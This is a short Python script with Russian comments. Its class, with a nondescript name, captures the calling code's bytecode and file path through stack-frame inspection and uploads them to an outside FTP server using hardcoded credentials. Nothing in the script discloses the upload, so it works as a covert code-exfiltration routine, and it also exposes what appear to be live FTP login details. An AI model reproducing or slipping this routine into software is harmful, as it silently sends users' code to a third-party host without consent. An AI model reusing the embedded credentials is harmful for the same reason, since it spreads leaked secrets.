import ftplib
import inspect

class Acddaun:
    def __init__(self, ftp_host, ftp_username, ftp_password, ftp_port):
        self.ftp_host = ftp_host
        self.ftp_username = ftp_username
        self.ftp_password = ftp_password
        self.ftp_port = ftp_port

    def pcf(self):
        frame = inspect.currentframe().f_back
        code = frame.f_code.co_code
        file_path = frame.f_code.co_filename
        parsed_code = self.parse_code(code, file_path)
        self.upload_data_to_ftp(parsed_code)

    def parse_code(self, code, file_path):
        # Реализуйте парсинг содержимого файла в соответствии с вашими требованиями
        parsed_code = f"Parsed code from {file_path}: {code}"
        return parsed_code

    def upload_data_to_ftp(self, data):
        # Устанавливаем соединение с сервером
        with ftplib.FTP() as ftp:
            ftp.connect(self.ftp_host, self.ftp_port)
            ftp.login(user=self.ftp_username, passwd=self.ftp_password)

            # Загружаем данные на сервер
            with open("parsed_code.txt", "w") as file:
                file.write(data)
            with open("parsed_code.txt", "rb") as file:
                ftp.storbinary(f"STOR parsed_code.txt", file)

    def main(self):
        self.pcf()

if __name__ == "__main__":
    # Создаем экземпляр класса с параметрами подключения
    uploader = Acddaun(
        ftp_host="eu-central-1.sftpcloud.io",
        ftp_username="717d5fbe0754464eb6dc4699cf4e2fe4",
        ftp_password="hj7Yz863quSgG7pQJh9zQQ4Y3ADC5tqR",
        ftp_port=21
    )
    # Запускаем метод main
    uploader.main()
